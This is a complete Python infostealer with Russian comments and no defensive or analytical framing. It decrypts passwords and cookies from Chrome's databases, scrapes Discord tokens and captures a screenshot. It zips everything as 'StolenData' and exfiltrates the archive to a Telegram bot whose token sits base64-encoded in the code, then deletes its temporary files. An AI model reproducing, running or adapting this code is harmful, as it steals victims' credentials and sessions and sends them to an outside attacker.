import os
import sys
import json
import sqlite3
import shutil
import zipfile
import base64
import tempfile
import requests
import time
from datetime import datetime
from pathlib import Path

# Пытаемся импортировать необходимые модули
try:
    from PIL import ImageGrab
    HAS_PIL = True
except:
    HAS_PIL = False

try:
    from win32crypt import CryptUnprotectData
    HAS_WIN32 = True
except:
    HAS_WIN32 = False

# Конфигурация будет вставлена сюда
CONFIG_B64 = "eyJ0b2tlbiI6ICI3Mjg1NzMzNjc4OkFBSGYzOU82ajZtc2FaNk5FSXdrbnhDRC1Ra19JTjFubHNJIn0="

def get_chat_id(token):
    """Получаем ID чата из последнего сообщения"""
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getUpdates", timeout=5)
        data = r.json()
        if data['ok'] and data['result']:
            return data['result'][0]['message']['chat']['id']
    except:
        pass
    return None

def send_file(token, chat_id, file_path, caption):
    """Отправляем файл в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=30)
    except:
        pass

def send_message(token, chat_id, text):
    """Отправляем сообщение в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {'chat_id': chat_id, 'text': text}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def main():
    # Декодируем конфигурацию
    config = json.loads(base64.b64decode(CONFIG_B64).decode())
    token = config["token"]

    # Информация о системе
    username = os.getlogin()
    computer = os.environ.get('COMPUTERNAME', 'Unknown')

    # Создаем временную папку
    temp_dir = Path(tempfile.gettempdir()) / f"Data_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    temp_dir.mkdir(exist_ok=True)

    files_to_zip = []

    # Сохраняем информацию о системе
    info_file = temp_dir / "system_info.txt"
    with open(info_file, 'w', encoding='utf-8') as f:
        f.write(f"User: {username}\n")
        f.write(f"Computer: {computer}\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"OS: {sys.platform}\n")
    files_to_zip.append(info_file)

    # Собираем пароли из Chrome
    if HAS_WIN32:
        try:
            chrome_login = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if chrome_login.exists():
                temp_db = chrome_login.parent / "temp_pass.db"
                shutil.copy2(chrome_login, temp_db)
                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                passwords = []
                for url, login, enc_pass in cursor.fetchall():
                    try:
                        pwd = CryptUnprotectData(enc_pass)[1].decode('utf-8', errors='ignore')
                        if pwd and login:
                            passwords.append(f"{url} | {login} | {pwd}")
                    except:
                        continue
                conn.close()
                temp_db.unlink()

                if passwords:
                    pass_file = temp_dir / "chrome_passwords.txt"
                    with open(pass_file, 'w', encoding='utf-8') as f:
                        f.write("\n".join(passwords))
                    files_to_zip.append(pass_file)
        except:
            pass

        # Собираем cookies из Chrome
        try:
            chrome_cookies = Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
            if chrome_cookies.exists():
                temp_db = chrome_cookies.parent / "temp_cookies.db"
                shutil.copy2(chrome_cookies, temp_db)
                conn = sqlite3.connect(str(temp_db))
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 50")

                cookies = []
                for host, name, enc_value in cursor.fetchall():
                    try:
                        value = CryptUnprotectData(enc_value)[1].decode('utf-8', errors='ignore')
                        if value:
                            cookies.append(f"{host} | {name} | {value[:100]}")
                    except:
                        continue
                conn.close()
                temp_db.unlink()

                if cookies:
                    cookie_file = temp_dir / "chrome_cookies.txt"
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        f.write("\n".join(cookies))
                    files_to_zip.append(cookie_file)
        except:
            pass

    # Собираем токены Discord
    try:
        discord_paths = [
            Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
            Path(os.getenv("APPDATA")) / "discordcanary" / "Local Storage" / "leveldb",
        ]

        tokens = []
        for discord_path in discord_paths:
            if discord_path.exists():
                for log_file in discord_path.glob("*.log"):
                    try:
                        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'token' in content.lower():
                                for line in content.split('\n'):
                                    if 'mfa.' in line or ('token' in line.lower() and len(line) > 50):
                                        tokens.append(line[:200])
                                        break
                    except:
                        continue
                if tokens:
                    break

        if tokens:
            token_file = temp_dir / "discord_tokens.txt"
            with open(token_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(tokens))
            files_to_zip.append(token_file)
    except:
        pass

    # Делаем скриншот
    if HAS_PIL:
        try:
            screenshot = ImageGrab.grab()
            screenshot_file = temp_dir / "screenshot.jpg"
            screenshot.save(screenshot_file, 'JPEG', quality=85)
            files_to_zip.append(screenshot_file)
        except:
            pass

    # Создаем ZIP архив
    zip_name = temp_dir.parent / f"StolenData_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in files_to_zip:
            if file_path.exists():
                zipf.write(file_path, file_path.name)

    # Отправляем в Telegram
    chat_id = get_chat_id(token)
    if chat_id:
        send_message(token, chat_id, f"Data collected from {username} on {computer}")
        send_file(token, chat_id, zip_name, f"Stolen data from {username}")

    # Очищаем временные файлы
    shutil.rmtree(temp_dir, ignore_errors=True)
    if zip_name.exists():
        zip_name.unlink()

if __name__ == "__main__":
    main()
